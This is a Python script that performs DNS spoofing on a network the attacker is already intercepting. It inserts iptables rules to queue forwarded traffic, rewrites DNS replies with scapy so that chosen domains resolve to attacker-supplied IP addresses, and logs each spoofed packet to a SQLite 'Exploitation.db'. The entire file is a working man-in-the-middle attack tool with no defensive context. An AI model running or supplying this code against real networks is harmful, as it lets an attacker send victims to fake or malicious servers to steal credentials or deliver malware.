
from scapy.all import *
from netfilterqueue import NetfilterQueue #apt-get install libnetfilter-queue-dev and pip install netfilterqueue
import sqlite3

conn = sqlite3.connect("Exploitation.db")
cur = conn.cursor()

dns_hosts = {}
while True:
    source = input("Enter source website (or 'q' to quit): ")
    if source.lower() == 'q':
        break
    source = source + "."
    source = source.encode('utf-8')
    destination = input("Destination web server: ")
    dns_hosts[source] = destination

def modify_packet(packet):
    """
    Modifies the DNS Resource Record `packet` ( the answer part)
    to map our globally defined `dns_hosts` dictionary.
    For instance, whenever we see a google.com answer, this function replaces 
    the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
    """
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet


def process_packet(packet):
    dlist = [source, destination]
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        if scapy_packet[DNSQR].qname in dns_hosts:
            print("[Before]:", scapy_packet.summary())
            dlist.append(scapy_packet.summary())
            try:
                scapy_packet = modify_packet(scapy_packet)
            except IndexError:
                # not UDP packet, this can be IPerror/UDPerror packets
                pass
            print("[After ]:", scapy_packet.summary())
            dlist.append(scapy_packet.summary())
            cur.execute('''INSERT INTO ARP_Spoofing (id, Source, Destination, Before, After) 
            VALUES (NULL, ?, ?, ?, ?)
             ''', dlist)
            conn.commit()
            # set back as netfilter queue packet
            packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()
    
    
QUEUE_NUM = 0
# insert the iptables FORWARD rule
subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM), shell=True)
subprocess.call("iptables -A FORWARD -p UDP --dport 53 -j DROP", shell=True)
# instantiate the netfilter queue
queue = NetfilterQueue()
    
print(dns_hosts)
print("Spoofing DNS...")
try:
    # bind the queue number to our callback `process_packet`
    # and start it
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    # if want to exit, make sure we
    # remove that rule we just inserted, going back to normal.
    os.system("iptables --flush")